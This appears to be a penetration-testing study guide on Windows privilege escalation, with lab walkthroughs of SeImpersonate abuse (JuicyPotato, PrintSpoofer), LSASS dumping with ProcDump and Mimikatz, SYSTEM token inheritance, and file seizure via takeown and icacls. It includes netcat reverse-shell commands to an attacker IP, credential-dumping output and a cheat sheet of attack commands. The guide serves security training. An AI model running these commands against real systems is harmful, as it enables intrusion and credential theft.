## 1. What Windows Privileges Actually Are

A **privilege** in Windows is permission to perform a *system-wide* action — things like managing services, loading device drivers, shutting down the computer, or debugging any running application. This is different from **access rights**, which control whether you can open a specific file or folder.

**Analogy:** Think of privileges as special *job titles or clearances* ("Fire Marshal," "Building Engineer") that let you do things affecting the whole building — whereas access rights are more like individual keys to individual rooms.

Key facts about privileges:
- They're stored in a database and handed to you (via your **access token**, covered in a previous document) when you log in.
- The same account can have **different privileges on different machines**, especially in an Active Directory (AD) environment — being powerful on one box doesn't mean you're powerful everywhere.
- Every time you try to do something privileged, Windows checks your access token to see (a) do you have the privilege at all, and (b) is it currently *enabled*.
- **Most privileges are disabled by default**, even if your account technically holds them. Some get enabled automatically when you open an administrative console; others need to be enabled manually (more on this below).

This matters a lot for an assessment: if you can log in as a user who holds a powerful-but-overlooked privilege, you may be able to escalate your access directly — without ever needing a traditional "exploit."

## 2. How Windows Decides Who Gets Access (The Authorization Process)

**Security principals** are anything Windows can authenticate — user accounts, computer accounts, processes running under an account's identity, and security groups. Every single one gets a unique, permanent **SID (Security Identifier)** the moment it's created — think of it as a serial number that never changes and is never reused.

Here's the high-level flow whenever someone tries to access something (like a shared folder):

<img width="771" height="561" alt="image" src="https://github.com/user-attachments/assets/6c84b0da-1bf1-421a-b00b-e023d589e85d" />

1. The user's **access token** is pulled up — this includes their own SID, the SIDs of every group they belong to, their privilege list, and other access info.
2. This token is compared against the **ACEs (Access Control Entries)** stored in the target object's **security descriptor** — basically the object's own guest list of who's allowed to do what.
3. Windows makes an instant grant-or-deny decision.

**Analogy:** Think of your access token as a laminated badge listing your name, your department, and your clearance level. The security descriptor on a locked door is the sign-in sheet taped next to it, listing exactly which badges (or departments) are allowed through. The guard (Windows) checks your badge against that sheet in a split second every single time you try a door.

Privilege escalation, at its core, is often about finding ways to either forge/borrow a better badge, or find a sign-in sheet that's more permissive than it should be.

## 3. Powerful Groups Worth Knowing

Certain built-in Windows groups carry outsized power — membership in any of these can realistically lead to **local admin**, **SYSTEM**, or even **Domain Admin** access.

| Group | What Members Can Do |
|---|---|
| **Default Administrators** (Domain Admins, Enterprise Admins) | "Super" groups with sweeping control across the domain. |
| **Server Operators** | Can modify services, access SMB file shares, and back up files. |
| **Backup Operators** | Can log onto Domain Controllers (DCs) locally — should be treated as equivalent to Domain Admins. Can create shadow copies of the SAM/NTDS credential databases, read the registry remotely, and access the DC's filesystem over SMB. Sometimes also added to the local Backup Operators group on regular (non-DC) machines. |
| **Print Operators** | Can log onto DCs locally and trick Windows into loading a malicious driver. |
| **Hyper-V Administrators** | If any DCs are virtualized, these admins should be treated as Domain Admins too, since they control the underlying VM. |
| **Account Operators** | Can modify non-protected user accounts and groups in the domain. |
| **Remote Desktop Users** | No special permissions by default, but often granted rights like RDP login — useful for lateral movement via RDP. |
| **Remote Management Users** | Can log onto DCs via PSRemoting (PowerShell remoting); sometimes mirrored to a local group on regular machines. |
| **Group Policy Creator Owners** | Can create new Group Policy Objects (GPOs), though linking them to a domain/OU needs additional delegated rights. |
| **Schema Admins** | Can modify the Active Directory schema itself — can plant a "backdoor" into any newly-created group/GPO by editing the default object permissions. |
| **DNS Admins** | Can load a DLL on a DC but can't restart the DNS service themselves — so a malicious DLL would just sit and wait for a natural reboot (good for persistence, less reliable for immediate access). A more dependable abuse path is creating a malicious WPAD DNS record instead. |

**Analogy:** Think of these groups as different keycards in an office building. A "Backup Operators" keycard might not say "Executive" on it, but if it happens to open the server room's back door and the file cabinet with the master records, it's effectively just as valuable as the CEO's own card.

## 4. Key User Rights Assignments

Beyond group membership, Windows has individual, fine-grained **user rights** that can be assigned via local or domain Group Policy. Here are some of the most important ones for privilege escalation:

| Setting Constant | Friendly Name | Who Normally Has It | What It Does |
|---|---|---|---|
| `SeNetworkLogonRight` | Access this computer from the network | Administrators, Authenticated Users | Controls who can connect over the network at all (needed for SMB, NetBIOS, CIFS, COM+). |
| `SeRemoteInteractiveLogonRight` | Allow log on through Remote Desktop Services | Administrators, Remote Desktop Users | Controls who can reach the login screen via RDP. Note: being able to *start* an RDP connection doesn't always mean you can actually log on at the console. |
| `SeBackupPrivilege` | Back up files and directories | Administrators | Lets you bypass normal file/registry permission checks — but only for backing up (reading) data. |
| `SeSecurityPrivilege` | Manage auditing and security log | Administrators | Controls who can configure what gets logged for security auditing, and who can view/clear the Security log. |
| `SeTakeOwnershipPrivilege` | Take ownership of files or other objects | Administrators | Lets you seize ownership of virtually any securable object — files, registry keys, services, even AD objects. (Covered in depth in Section 10.) |
| `SeDebugPrivilege` | Debug programs | Administrators | Lets you attach to or open *any* process, even ones you don't own — extremely powerful, as it reaches into sensitive OS internals. (Covered in depth in Section 9.) |
| `SeImpersonatePrivilege` | Impersonate a client after authentication | Administrators, Local Service, Network Service, Service | Lets a program act on behalf of another authenticated user or account. (Covered in depth starting in Section 6.) |
| `SeLoadDriverPrivilege` | Load and unload device drivers | Administrators | Drivers run as highly privileged code, so this is a powerful right — not needed if a signed driver is already present. |
| `SeRestorePrivilege` | Restore files and directories | Administrators | The reverse of `SeBackupPrivilege` — bypasses permission checks when *writing* restored files, and can even set the security owner of restored objects. |
| `SeTcbPrivilege` | Act as part of the operating system | Administrators, Local Service, Network Service, Service | Lets a process impersonate *any* user and access whatever that user could access. Often legitimately used by antivirus or backup software. Should be reserved strictly for service accounts that genuinely need it. |

**How to check your own rights:** running `whoami /priv` lists every privilege assigned to your current account. Some privileges only show up — or only actually work — inside an **elevated** (administrator) console, thanks to **User Account Control (UAC)**, a security feature since Windows Vista that restricts programs from running with full power unless specifically elevated.

## 5. Elevated vs. Standard User Privileges (`whoami /priv`)

Comparing an elevated administrator session to a standard user session shows a dramatic difference.

### Local Administrator — Elevated Console
```
PS C:\evilcorp> whoami

winlpe-srv01\administrator

PS C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

**Important distinction:** a privilege listed as `Disabled` isn't the same as "not having it." It means the account *has been granted* that privilege, but it isn't currently switched on for use in the active token. **Windows has no built-in command to flip these on** — you need a scripting approach (such as community PowerShell scripts like [Enable-Privilege.ps1](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) or [Set-TokenPrivilege_signed.ps1](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)) to enable specific privileges within your current process.

### Standard User Console
```
PS C:\evilcorp> whoami

winlpe-srv01\john

PS C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Night and day compared to the administrator's list above — a standard user has almost nothing of note.

### Backup Operators Group Member
```
PS C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Notice: even without full administrator rights, this account has `SeShutdownPrivilege`. That alone is significant — if this user ever logs on **locally** (not via RDP or WinRM) to a **Domain Controller**, they could shut it down, causing a major service outage. A small, easy-to-overlook privilege with a potentially big real-world consequence.

**Why this matters as both attacker and defender:** it's surprisingly common to find low-privilege-looking accounts quietly added to one of these powerful groups. Reviewing group membership regularly is essential on both sides of an assessment.

## 6. SeImpersonatePrivilege & SeAssignPrimaryTokenPrivilege

Every Windows process carries a **token** describing the account running it. Tokens live in memory and aren't treated as a fully "secure" resource — in principle, someone with memory-reading capability could potentially extract one. To actually *use* another process's token to act on its behalf, you need the **`SeImpersonate`** privilege.

> **Note:** `SeImpersonatePrivilege` is **not** restricted to administrative accounts only. As the rights table in Section 4 shows, it's a *standard* assignment for Administrators **as well as** `Local Service`, `Network Service`, and `Service` accounts — meaning plenty of ordinary service accounts legitimately carry it.
> This is exactly why it's such a well-known privilege-escalation lever: attackers frequently land on a box *as* one of these service accounts (e.g., a SQL Server service account, a web application pool identity) and find `SeImpersonatePrivilege` sitting there, ready to abuse — as the JuicyPotato walkthrough below demonstrates directly.

**Legitimate use case:** some Windows processes legitimately use another process's token to go from Administrator-level up to **Local System** (even more privileged). They typically do this by calling the WinLogon process to obtain a SYSTEM token, then relaunching themselves with that token.

**The attack ("Potato" style):** attackers abuse this exact mechanism when they control a service account that *can* impersonate (`SeImpersonate`) but can't directly obtain full SYSTEM rights. The trick is to lure a process that's already running as SYSTEM into connecting to a process you control — and when it does, you get to use its token.

This situation comes up constantly in real engagements: gaining code execution through a web shell on an ASP.NET app, through a Jenkins server, or by running commands via MSSQL queries all tend to land you in a service account context. **Whenever you get code execution this way, checking for `SeImpersonatePrivilege` should be one of your very first moves** — it's often a fast, reliable route to full SYSTEM access.

This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) is worth reading for further details on token impersonation attacks.

## 7. Exploiting SeImpersonate with JuicyPotato

Let's walk through a complete real-world-style scenario.

**Setup:** You've obtained SQL credentials (`sql_dev:Str0ng_P@ssw0rd!`) — perhaps found in a `logins.sql` file on a file share using a credential-hunting tool like Snaffler. Let's connect to the SQL instance with Impacket's `mssqlclient.py`.

```
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162)
[!] Press help for extra shell commands
SQL>
```

Next, enable the `xp_cmdshell` stored procedure, which lets you run operating system commands through SQL:

```
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```
*(Impacket automatically runs the needed `RECONFIGURE` statement behind the scenes — you don't need to type it yourself.)*

Confirm what account you're actually running as:

```
SQL> xp_cmdshell whoami

output
--------------------------------------------------------------------------------
nt service\mssql$sqlexpress01
```

Notice: this is a **service account**, not an administrator — exactly the scenario described in Section 6. Now check its privileges:

```
SQL> xp_cmdshell whoami /priv

output
--------------------------------------------------------------------------------
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

`SeImpersonatePrivilege` is `Enabled` — this is the key finding. [JuicyPotato](https://github.com/ohpe/juicy-potato) can exploit either `SeImpersonate` or `SeAssignPrimaryToken` by abusing how DCOM/NTLM reflection works.

### Running JuicyPotato

Upload `JuicyPotato.exe` and `nc.exe` (Netcat, for a reverse shell) to the target. Start a Netcat listener on your own machine on port 8443, then run:

```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output
--------------------------------------------------------------------------------
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375

[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
[+] calling 0x000000000088ce08
```

| Flag | Meaning |
|---|---|
| `-l 53375` | The local port JuicyPotato uses for its COM server listener |
| `-p c:\windows\system32\cmd.exe` | The program to actually launch once elevated |
| `-a "..."` | Arguments passed to that program (here, launching Netcat to call back to the attacker) |
| `-t *` | Which process-creation method to try — `*` tells it to attempt both `CreateProcessWithTokenW` (needs `SeImpersonate`) and `CreateProcessAsUser` (needs `SeAssignPrimaryToken`) |

Catching the resulting shell:

```
$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332

C:\Windows\system32>whoami
nt authority\system
```

Success — a low-privilege SQL service account has become full `NT AUTHORITY\SYSTEM`.

## 8. When JuicyPotato Doesn't Work: PrintSpoofer & RoguePotato

JuicyPotato stopped working starting with **Windows Server 2019** and **Windows 10 build 1809** onward, due to Microsoft patches. Two newer tools fill the gap, exploiting the same underlying privilege:

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) — works on Windows 10 and Server 2019 where JuicyPotato fails.
- [RoguePotato](https://github.com/antonioCoco/RoguePotato) — another modern alternative covering similar ground.

### Using PrintSpoofer

PrintSpoofer can spawn a SYSTEM process in your current console, on an active desktop session, or — as shown here — send a reverse shell:

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output
--------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
```

Catching the shell on your Netcat listener:

```
$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847

C:\Windows\system32>whoami
nt authority\system
```

**Bottom line:** `SeImpersonatePrivilege` abuse is extremely common in real assessments. It's worth being comfortable with multiple tools (JuicyPotato, PrintSpoofer, RoguePotato) since which one works depends entirely on the exact Windows version and build you're facing.

## 9. SeDebugPrivilege

`SeDebugPrivilege` ("Debug programs") lets an account attach to and inspect **any** running process — not just ones it owns. It's sometimes handed out to developers who need to troubleshoot system-level components, as an alternative to making them a full local administrator — but it's dangerous, because it effectively grants access to sensitive memory and kernel/application structures across the whole system.

**Real-world recon tip:** during an internal penetration test, researching employees on LinkedIn (to identify likely developers or sysadmins) combined with capturing password hashes via tools like Responder or Inveigh can help you prioritize *which* captured hashes are worth cracking first — developer accounts are more likely to carry privileges like this one, which you might not otherwise be able to spot remotely with a tool like BloodHound.

Checking for the privilege:

```
C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

### Method 1: Dumping LSASS Memory with ProcDump + Mimikatz

- We can use [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory.
- `lsass.exe` (the Local Security Authority Subsystem Service) stores user credentials in memory after login — making it a prime target.

```
C:\evilcorp> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:46] Dump count reached.
```

Then load the dump file into **Mimikatz** to extract credentials:

```
C:\evilcorp> mimikatz.exe

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
        msv :
         [00000003] Primary
         * Username : jordan
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
```

> **Tips:** always type `log` as your very first Mimikatz command — it writes all subsequent output to a `.txt` file automatically, which is especially helpful on a server with many logged-on accounts worth capturing.

Once you have the NTLM hash for an account like `jordan`, you can attempt a **pass-the-hash** attack — using the hash itself (without ever cracking it into plaintext) to authenticate elsewhere, especially effective if the same local administrator password is reused across multiple machines (a very common finding in larger organizations).

**No tools allowed?** If you have RDP access but can't upload external binaries, you can manually create an LSASS memory dump via **Task Manager** → Details tab → select the `lsass.exe` process → "Create dump file." Download that file back to your own machine and process it with Mimikatz exactly the same way.

### Method 2: SeDebugPrivilege for Direct Remote Code Execution as SYSTEM

Rather than dumping credentials, you can also use `SeDebugPrivilege` to directly spawn a new process that **inherits the token of an existing SYSTEM process** — instant SYSTEM-level code execution, no credential dumping required.

**Steps:**
1. Transfer a proof-of-concept script (such as [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)) to the target.
2. Open an **elevated** PowerShell console as the privileged user.
3. Run `tasklist` to find the PID of a process known to run as SYSTEM:

```
PS C:\evilcorp> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
smss.exe                       340 Services                   0      1,212 K
wininit.exe                    548 Services                   0      5,240 K
winlogon.exe                   612 Console                    1     10,408 K
```

4. Target `winlogon.exe` (PID `612`), which reliably runs as SYSTEM on Windows hosts, using the script's syntax:
   `[MyProcess]::CreateProcessFromParent(<system_pid>, <command_to_execute>, "")`
   (Note the required empty third argument `""` — the script won't work correctly without it.)

You could also use PowerShell's `Get-Process` cmdlet to directly grab the PID of a well-known SYSTEM process (like LSASS itself), skipping the manual `tasklist` lookup.

- Other community tools exist that automate this exact "pop a SYSTEM shell via SeDebugPrivilege" trick. Like this [one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- If you don't have an interactive session (e.g., you only have command injection or a basic web shell), you'll need to adapt these proof-of-concept scripts to instead return a reverse shell to your own machine, or perform another action like creating a new admin user.
- Worth keeping this technique in your back pocket for situations where dumping LSASS memory doesn't yield useful plaintext credentials or hashes.

## 10. SeTakeOwnershipPrivilege

`SeTakeOwnershipPrivilege` lets its holder take ownership of **any securable object** — Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. Technically, it grants `WRITE_OWNER` rights, meaning you can change who the recorded "owner" of an object is in its security descriptor.

**Analogy:** Imagine a filing cabinet where, whoever is listed as its "owner" in a company directory automatically gets to decide who else can open it. This privilege effectively lets you walk up and relabel yourself as the owner — regardless of who actually put the cabinet there.

- Administrators have this by default.
- It's rare on a standard user account, but you might find it on a **service account** — for example, one responsible for backup jobs or VSS (Volume Shadow Copy) snapshots — often paired with related privileges like `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege`, as a more fine-grained alternative to just making the account a full local admin.
- It's configured via Group Policy at: `Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment`.
- In Active Directory environments, this right could even be something you *grant* to an account you control, via a misconfigured GPO (using a tool like [SharpGPOAbuse](https://github.com/ReversecLabs/SharpGPOAbuse)), then abuse it.

> ⚠️ **This is a somewhat destructive, "edge case" technique** — taking ownership of a live, in-use file (such as a production `web.config`) could break an application or disrupt other users. Always get client consent before using this against anything that looks production-critical, and be especially cautious with files buried in nested subdirectories, since reverting permission changes across many folders can be difficult. Some clients may prefer you simply *document* that the flaw exists rather than actually exploit it.

### Walkthrough: Reading a Protected File

**Step 1 — Check current privileges.**
```
PS C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
```

**Step 2 — Enable the privilege** (recall: having it ≠ it being active). This requires a script, since Windows has no built-in toggle. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in this [blog post](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/), as well as this [one](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) which builds on the initial concept.
```
PS C:\evilcorp> Import-Module .\Enable-Privilege.ps1
PS C:\evilcorp> .\EnableAllTokenPrivs.ps1
PS C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
```

**Step 3 — Find an interesting target.** On a company file share with typical "Public" and "Private" department folders, you discover a file called `cred.txt` inside a "Private\IT" subdirectory that regular Domain Users can *see* but not *read*.

**Step 4 — Investigate ownership.** Checking the file directly shows no visible owner (a sign you lack sufficient permission to even view that detail):
```
PS C:\evilcorp> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```
Checking the parent folder instead reveals it's owned by a service account:
```
PS C:\evilcorp> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Directory of C:\Department Shares\Private\IT

06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
```

**Step 5 — Take ownership of the file:**
```
PS C:\evilcorp> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\john".
```

**Step 6 — Confirm it worked:**
```
PS C:\evilcorp> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\john
```

**Step 7 — Owning the file isn't always enough to read it!** Ownership controls who gets to *change permissions*, not automatic read access:
```
PS C:\evilcorp> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
```

**Step 8 — Grant yourself explicit read/write access using `icacls`:**
```
PS C:\evilcorp> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant john:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

**Step 9 — Finally, read the file:**
```
PS C:\evilcorp> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
root:n1X_p0wer_us3er!
```

A plaintext credential, recovered purely through a privilege-abuse technique — no password cracking or exploit needed.

> **After the engagement:** make every effort to revert ownership and permissions back to their original state. If you can't, alert the client and document the changes thoroughly in your report's appendix.

## 11. Cheat Sheet

| Goal | Command / Tool |
|---|---|
| List your current privileges | `whoami /priv` |
| Attempt to enable held-but-disabled privileges | Community script (e.g. `Enable-Privilege.ps1`, `EnableAllTokenPrivs.ps1`) — no built-in Windows command exists |
| Exploit `SeImpersonate`/`SeAssignPrimaryToken` (older Windows) | JuicyPotato |
| Exploit `SeImpersonate` (Win10 1809+ / Server 2019+) | PrintSpoofer or RoguePotato |
| Dump LSASS memory (needs `SeDebugPrivilege`) | `procdump.exe -accepteula -ma lsass.exe lsass.dmp` |
| Extract credentials from an LSASS dump | Mimikatz: `sekurlsa::minidump <file>` then `sekurlsa::logonpasswords` |
| Spawn a SYSTEM process by inheriting a SYSTEM parent's token | PoC script using `SeDebugPrivilege` (e.g. `psgetsys.ps1`) targeting `winlogon.exe` or similar |
| Take ownership of a file/object | `takeown /f <path>` |
| Grant yourself access after taking ownership | `icacls <path> /grant <user>:F` |
| Check current file owner | `Get-ChildItem ... \| select ..., @{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}` |

## 12. Big-Picture Takeaways

1. A privilege being listed for your account as `Disabled` doesn't mean you lack it — it means it's granted but not currently active, and Windows provides no built-in way to flip it on (you'll need a script).
2. Group membership (Backup Operators, Server Operators, Print Operators, etc.) can quietly grant powerful rights that look harmless on the surface but can lead to full Domain Admin or SYSTEM access.
3. `SeImpersonatePrivilege` is commonly found on **service accounts**, not just administrators — this is precisely why "Potato" style attacks (JuicyPotato, PrintSpoofer, RoguePotato) are so widely useful in real engagements.
4. Which "Potato" tool works depends entirely on the exact Windows version/build — JuicyPotato stopped working on Windows Server 2019 / Windows 10 1809+, so know the alternatives.
5. `SeDebugPrivilege` offers two very different paths to SYSTEM: dumping and cracking credentials from LSASS memory, or directly spawning a process that inherits an existing SYSTEM process's token.
6. `SeTakeOwnershipPrivilege` lets you seize control of virtually any object, but owning a file doesn't automatically mean you can read it — you'll typically need to follow up with `icacls` to actually grant yourself access.
7. Privilege-abuse techniques, especially `SeTakeOwnershipPrivilege`, can be destructive and hard to reverse — always weigh real-world impact and get client consent before changing ownership on anything that looks production-critical.
8. Reviewing "who holds which privilege" is valuable for both attackers and defenders — overlooked privilege assignments on seemingly low-value accounts are a recurring theme across almost every technique in this document.
